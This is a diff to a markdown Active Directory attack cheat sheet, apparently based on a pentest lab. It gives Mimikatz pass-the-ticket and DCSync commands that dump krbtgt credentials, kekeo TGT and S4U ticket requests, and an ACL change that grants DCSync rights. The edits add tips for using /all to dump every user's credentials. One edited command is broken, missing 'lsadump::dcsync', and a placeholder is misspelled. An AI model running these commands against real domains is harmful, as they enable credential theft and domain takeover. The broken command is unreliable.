@@ -242,8 +242,9 @@ Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 ```
 
 #### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
 ```
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
+Invoke-Mimikatz -Command '"/user:<DOMAIN>\krbtgt"'
 ```
 
 ### Printer bug
@@ -313,6 +314,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt <KIRBI FILE>"'
 ```
 
 #### Run DCSync to get credentials:
+- use ```/all``` instead of ```/user``` to list all users
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
@@ -321,19 +323,20 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN
 #### Requesting TGT with a PC hash
 ```
 ./kekeo.exe
-Tgt::ask /user:dcorp-adminsrv$ /domain:<domain> /rc4:<hash>
+Tgt::ask /user:dcorp-adminsrv$ /domain:<DOMAIN> /rc4:<HAHS>
 ```
 
 #### Requesting TGS
 No validation for the SPN specified
 ```
-Tgs::s4u /tgt:<kirbi file> /user:Administrator@<domain> /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL
+Tgs::s4u /tgt:<kirbi file> /user:Administrator@<DOMAIN> /service:time/<MACHINE NAME>|ldap/<MACHINE NAME>
 ```
 
 #### Using mimikatz to inject TGS ticket and executing DCsync
+- use ```/all``` instead of ```/user``` to list all users
 ```
-Invoke-Mimikatz -Command '"Kerberos::ptt <kirbi file>"'
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:<shortdomain>\krbtgt"'
+Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
 
 ## DNS Admins
@@ -383,6 +386,7 @@ Add-DomainObjectAcl -TargetIdentity 'DC=<PARENT DOMAIN>,DC=<TOP DOMAIN>' -Princi
 ```
 
 #### Execute DCSYNC
+- use ```/all``` instead of ```/user``` to list all users
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<PARENT DOMAIN>\krbtgt /domain:<PARENT DOMAIN>"'
 ```
@@ -411,6 +415,7 @@ runas /user:<DOMAIN>\<USER> /netonly cmd
 ```
 
 #### Execute DCSync
+- use ```/all``` instead of ```/user``` to list all users
 ```
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt /domain:<DOMAIN>"'
 ```
